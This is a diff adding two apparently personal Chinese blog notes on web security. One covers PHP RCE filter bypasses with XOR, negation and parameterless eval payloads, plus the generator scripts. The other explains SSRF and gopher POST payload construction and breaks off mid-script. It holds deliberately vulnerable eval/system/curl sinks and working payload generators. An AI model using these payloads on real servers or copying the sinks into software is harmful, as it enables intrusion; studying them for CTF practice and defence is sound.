@@ -6904,4 +6904,384 @@ $ <span class="token function">find</span> ./ -name nayst -exec <span class="tok
         <tag>笔记</tag>
       </tags>
   </entry>
+  <entry>
+    <title>一些特殊的RCE绕过</title>
+    <url>/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/</url>
+    <content><![CDATA[<h1 id="无字母数字"><a href="#无字母数字" class="headerlink" title="无字母数字"></a>无字母数字</h1><p>当字母和数字都被过滤时怎样RCE呢？核心代码如下。</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z0-9]/is'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  	<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span></span></code></pre>
+
+<p>利用非字母数字字符，配合运算符得到需要的字符。</p>
+<h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p>在PHP中，两个变量的值进行异或时，会先将两个变量的值转换为ASCII，再将ASCII转换为二进制，再对二进制数据进行异或，再转为ASCII，最后转为字符串。</p>
+<p>由此可以构造脚本得到一个字典，然后需要哪个字符的时候就遍历字典。</p>
+<ul>
+<li><p>构造字典</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"output.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
+<span class="token variable">$dict</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
+<span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/[A-Za-z0-9]+/'</span><span class="token punctuation">;</span>
+
+<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token comment">// 前16个前面加0</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"0"</span> <span class="token operator">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 10转16</span>
+    <span class="token keyword">else</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// 如果被限制了直接跳过这个字符</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span><span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span> <span class="token comment">// 16转ascii</span>
+    <span class="token comment">// 没被限制加%，就变成了url编码</span>
+    <span class="token keyword">else</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"%"</span> <span class="token operator">.</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token comment">// 前16前面加0</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"0"</span> <span class="token operator">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">else</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// 只要不被限制的</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span><span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token comment">// 在前面加%组成url编码</span>
+            <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"%"</span> <span class="token operator">.</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
+            <span class="token comment">// 记录异或得到的内容、由哪两个异或来的</span>
+            <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          	<span class="token comment">//	只要可用字符</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$out</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">31</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$out</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">127</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// ascii转10</span>
+                <span class="token variable">$dict</span> <span class="token operator">=</span> <span class="token variable">$dict</span> <span class="token operator">.</span> <span class="token variable">$out</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" "</span> <span class="token operator">.</span> <span class="token variable">$a</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" "</span> <span class="token operator">.</span> <span class="token variable">$b</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$dict</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>
+</li>
+<li><p>遍历字典</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    a <span class="token operator">=</span> <span class="token string">''</span>
+    b <span class="token operator">=</span> <span class="token string">''</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> word<span class="token punctuation">:</span>
+        f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"output.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>
+        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+            dic <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> dic <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span><span class="token keyword">break</span>
+            <span class="token keyword">if</span> dic<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> i<span class="token punctuation">:</span>
+                a <span class="token operator">+=</span> dic<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>
+                b <span class="token operator">+=</span> dic<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>
+                <span class="token keyword">break</span>
+        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    output <span class="token operator">=</span> <span class="token string">"('"</span><span class="token operator">+</span>a<span class="token operator">+</span><span class="token string">"'^'"</span><span class="token operator">+</span>b<span class="token operator">+</span><span class="token string">"')"</span>
+    <span class="token keyword">return</span> output
+
+s1 <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your function:"</span><span class="token punctuation">)</span>
+s2 <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your command:"</span><span class="token punctuation">)</span>
+flag <span class="token operator">=</span> search<span class="token punctuation">(</span>s1<span class="token punctuation">)</span> <span class="token operator">+</span> search<span class="token punctuation">(</span>s2<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">";"</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre></li>
+</ul>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220806171447231.png" class="" loading="lazy">
+
+<p>成功执行！</p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220806173524099.png" class="" loading="lazy">
+
+<h2 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h2><p>在PHP中，字符串被取反后还会在eval函数中执行。</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$function</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>
+<span class="token variable">$command</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ls"</span><span class="token punctuation">;</span>
+
+<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"(~"</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">")(~"</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>
+
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220806172855556.png" class="" loading="lazy">
+
+<p>成功执行！</p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220806173618635.png" class="" loading="lazy">
+
+<h2 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h2><p>利用PHP中的<a href="https://www.php.net/manual/zh/language.operators.increment.php">递增&#x2F;递减运算符</a>，也就是说<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>，那么理论上只要能构造出任意字母即可执行命令。</p>
+<p>在php中，强制输出数组时，数组将被转换成字符串<code>Array</code>，那么就可以拿到A了。</p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220807234815237.png" class="" loading="lazy">
+
+<h1 id="无参数"><a href="#无参数" class="headerlink" title="无参数"></a>无参数</h1><p>当限制参数的时候如何操作呢？核心代码如下：</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    
+    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>核心思路就是<strong>通过嵌套函数达到读文件或者RCE</strong>的目的，重点就是对PHP原生函数的利用。</p>
+<p><strong>scandir</strong>可以返回指定目录下有哪些文件，scandir(‘.’)就可以看到当前目录下有哪些文件，再利用数组函数选择需要读的文件读取。</p>
+<p>常用的数组函数：</p>
+<ol>
+<li><a href="https://www.php.net/manual/zh/function.end.php">end()</a>- 将数组的内部指针指向最后一个单元</li>
+<li><a href="https://www.php.net/manual/zh/function.key.php">key()</a>- 从关联数组中取得键名</li>
+<li><a href="https://www.php.net/manual/zh/function.each.php">each()</a>- 返回数组中当前的键／值对并将数组指针向前移动一步</li>
+<li><a href="https://www.php.net/manual/zh/function.prev.php">prev()</a>- 将数组的内部指针倒回一位</li>
+<li><a href="https://www.php.net/manual/zh/function.reset.php">reset()</a>- 将数组的内部指针指向第一个单元</li>
+<li><a href="https://www.php.net/manual/zh/function.next.php">next()</a>- 将数组中的内部指针向前移动一位</li>
+</ol>
+<p>常用的读文件函数：</p>
+<ol>
+<li>show_source</li>
+<li>readfile</li>
+<li>highlight_file</li>
+<li>file_get_contents</li>
+<li>readgzfile</li>
+</ol>
+<p>payload：show_source(数组操作选择文件(scandir(路径)));</p>
+<p>那么只需要构造出需要的路径就行了。</p>
+<h2 id="localeconv"><a href="#localeconv" class="headerlink" title="localeconv"></a>localeconv</h2><p><code>localeconv</code>函数返回一包含本地数字及货币格式信息的数组，再通过<code>current</code>和<code>pos</code>，返回数组中的单元默认第一个：</p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816100328039.png" class="" loading="lazy">
+
+<p>或者<code>reset</code>函数将内部指针指向数组中的第一个元素，并输出。</p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816101740631.png" class="" loading="lazy">
+
+<h2 id="chr"><a href="#chr" class="headerlink" title="chr"></a>chr</h2><p><code>chr</code>函数可以从不同的ascii返回字符，且以256为周期循环，46对应的点，那么构造出46就行了，有多种思路：</p>
+<ol>
+<li><p>利用<a href="https://www.w3school.com.cn/php/php_ref_math.asp">PHP中的数学函数</a>构造出46。种子可以用数学常量，或者特殊函数的返回值。例如：<code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))));</code></p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816104755870.png" class="" loading="lazy">
+</li>
+<li><p>利用<a href="https://www.w3school.com.cn/php/php_ref_date.asp">PHP中的时间函数</a>构造出46。chr函数是以256为周期循环返回字符，所以只要在增加或者周期性变化的返回值都可以得到<code>.</code>，例如：<code>chr(pos(localtime()));</code></p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816110002100.png" class="" loading="lazy"></li>
+</ol>
+<h2 id="crypt"><a href="#crypt" class="headerlink" title="crypt"></a>crypt</h2><p>利用<code>crypt</code>函数返回 DES、Blowfish 或 MD5 算法加密的字符串，其中有概率出现<code>.</code>或者<code>/</code>在末尾。种子可以利用时间函数得到。再利用<code>ord</code>函数返回字符串中第一个字符的Ascii值，而<code>hebrevc</code>可以得到第一位为<code>.</code>的字符串。</p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816111342400.png" class="" loading="lazy">
+
+<p>也可以用<code>strrev</code>将字符串倒序，这样可以得到第一位为<code>.</code>或者<code>/</code>的字符串。</p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816111104220.png" class="" loading="lazy">
+
+<p><code>crypt(serialize(array())))</code>也可以得到以<code>.</code>或者<code>/</code>结尾的字符串，再利用<code>strrev</code>倒序：</p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816111833197.png" class="" loading="lazy">
+
+<h2 id="getcwd"><a href="#getcwd" class="headerlink" title="getcwd"></a>getcwd</h2><p><code>getcwd</code>可以得到当前目录的绝对路径</p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816113030394.png" class="" loading="lazy">
+
+<h2 id="realpath"><a href="#realpath" class="headerlink" title="realpath"></a>realpath</h2><p><code>realpath(&#39;.&#39;)</code>可以得到当前目录的绝对路径：</p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816140209612.png" class="" loading="lazy">
+
+<h2 id="dirname"><a href="#dirname" class="headerlink" title="dirname"></a>dirname</h2><p><code>dirname</code>可以返回路径中的目录部分。</p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816143824926.png" class="" loading="lazy">
+
+<p>由此可以读取其他路径的文件。要注意的是，在读其他目录的文件时要先用<code>chdir</code>切换目录，否则读取的还是原路径：</p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816201722199.png" class="" loading="lazy">
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/miuzzx/article/details/108569080">ctfshow web入门 web41</a></p>
+<p><a href="https://www.freebuf.com/articles/web/261800.html">php rce之无参数读文件</a></p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ssrf</title>
+    <url>/2022/08/14/ssrf/</url>
+    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>​	SSRF(<strong>S</strong>erver-<strong>S</strong>ide <strong>R</strong>equest <strong>F</strong>orgery)，即服务器请求伪造，是一种由攻击者构造，从而<strong>让服务端发起请求</strong>的一种安全漏洞，<br>它将一个可以发起网络请求的服务当作跳板来攻击其他服务，SSRF的攻击目标一般是内网。<br>​    当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定地址的图片、下载等)，<br>但是没有对目标地址做过滤与限制时就会出现SSRF。</p>
+<h1 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h1><ol>
+<li>能够对外发起网络请求的地方，就可能存在 SSRF 漏洞</li>
+<li>从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed）</li>
+<li>数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）</li>
+<li>Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）</li>
+<li>文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）</li>
+</ol>
+<h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><ol>
+<li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的<a href="https://www.cnblogs.com/yuanshu/p/11588341.html">banner 信息</a></li>
+<li>攻击运行在内网或本地的应用程序</li>
+<li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)</li>
+<li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)</li>
+<li>下载内网资源(如：利用<code>file</code>协议读取本地文件等)</li>
+<li>进行跳板</li>
+<li>无视cdn</li>
+<li>利用Redis未授权访问，HTTP CRLF注入实现getshell</li>
+</ol>
+<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p><code>file_get_contents()</code>、<code>fsockopen()</code>、<code>curl_exec()</code>、<code>fopen()</code>、<code>readfile()</code>等函数使用不当会造成SSRF漏洞</p>
+<h1 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h1><ol>
+<li><code>file</code>： 在有回显的情况下，利用 file 协议可以读取任意内容</li>
+<li><code>dict</code>：泄露安装软件版本信息，查看端口，操作内网redis服务等</li>
+<li><code>http(s)</code>：探测内网主机存活</li>
+<li><code>gopher</code>：gopher支持发出GET、POST请求</li>
+</ol>
+<p>主要了解一下gopher协议，平时用的比较少：</p>
+<p><code>gopher</code>协议是一种信息查找系统，他将<code>Internet</code>上的文件组织成某种索引，方便用户从<code>Internet</code>的一处带到另一处。在<code>WWW</code>出现之前，<code>Gopher</code>是<code>Internet</code>上最主要的信息检索工具，Gopher站点也是最主要的站点，使用<code>tcp70</code>端口。利用此协议可以攻击内网的 Redis、Mysql、FastCGI、ftp等等，也可以发送 GET、POST 请求。这拓宽了 SSRF 的攻击面。</p>
+<pre class="language-none"><code class="language-none">gopher协议的格式：gopher:&#x2F;&#x2F;IP:port&#x2F;_TCP&#x2F;IP数据流</code></pre>
+
+<ul>
+<li>gopher协议发送http get请求</li>
+</ul>
+<blockquote>
+<p>构造<code>HTTP</code>数据包</p>
+<p><code>URL</code>编码、替换回车换行为<code>%0d%0a</code>，<code>HTTP</code>包最后加<code>%0d%0a</code>代表消息结束</p>
+<p>发送<code>gopher</code>协议, 协议后的<code>IP</code>一定要接端口</p>
+</blockquote>
+<ul>
+<li>发送http post请求</li>
+</ul>
+<blockquote>
+<p><code>POST</code>与<code>GET</code>传参的区别：它有<code>4</code>个参数为必要参数</p>
+<p>需要传递<code>Content-Type</code>，<code>Content-Length</code>，<code>host</code>，<code>post</code>参数</p>
+</blockquote>
+<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>关键代码：</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$curlobj</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POST</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span></code></pre>
+
+<h2 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h2><p>使用http协议直接对内网的Web应用进行访问</p>
+<blockquote>
+<p>payload：<a href="http://localhost/flag.txt">http://localhost/flag.txt</a></p>
+</blockquote>
+<img src="/2022/08/14/ssrf/image-20220814121710304.png" class="" loading="lazy">
+
+<h2 id="伪协议读文件"><a href="#伪协议读文件" class="headerlink" title="伪协议读文件"></a>伪协议读文件</h2><p>利用伪协议可以直接拿到文件源码内容</p>
+<blockquote>
+<p>Payload：file:&#x2F;&#x2F;&#x2F;Applications&#x2F;phpstudy&#x2F;WWW&#x2F;flag.php</p>
+</blockquote>
+<img src="/2022/08/14/ssrf/image-20220814122739624.png" class="" loading="lazy">
+
+<h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>利用<code>dict</code>和<code>http</code>协议可以探测内网主机和端口存活情况：</p>
+<blockquote>
+<p>payload：url&#x3D;dict:&#x2F;&#x2F;127.0.0.1:3306</p>
+</blockquote>
+<img src="/2022/08/14/ssrf/image-20220814125217534.png" class="" loading="lazy">
+
+<p>可以看到我这里3306端口是打开的，版本号是<code>8.0.28</code></p>
+<img src="/2022/08/14/ssrf/image-20220814131009804.png" class="" loading="lazy">
+
+<h2 id="发POST请求"><a href="#发POST请求" class="headerlink" title="发POST请求"></a>发POST请求</h2><p>可以利用<code>gopher</code>协议发起POST请求</p>
+<ul>
+<li><p>接收文件<code>post.php</code>代码：</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$shell</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$shell</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span></code></pre></li>
+</ul>
+<p>先构造POST请求包，与GET不同，必须传递<code>Content-Type</code>，<code>Content-Length</code>，<code>host</code>，<code>post</code>参数，否则会报错</p>
+<pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/post.php</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">8</span></span>
+
+shell=ls</code></pre>
+
+<p>再使用如下python脚本生成标准格式的gopher协议</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
+
+payload <span class="token operator">=</span> \
+<span class="token triple-quoted-string string">"""POST /post.php HTTP/1.1
+Host: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 8
+
+shell=ls
+"""</span>
+tmp <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment"># 将换行编码成%0a</span>
+new <span class="token operator">=</span> tmp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'%0A'</span><span class="token punctuation">,</span><span class="token string">'%0D%0A'</span><span class="token punctuation">)</span>	<span class="token comment"># 在gopher协议中，进行URL编码，会将回车换行编码为%0d%0a</span>
+result <span class="token operator">=</span> <span class="token string">'gopher://127.0.0.1:80/'</span><span class="token operator">+</span><span class="token string">'_'</span><span class="token operator">+</span>new <span class="token comment"># 拼接成完整payload</span>
+result <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token comment"># 再次url编码，因为</span>
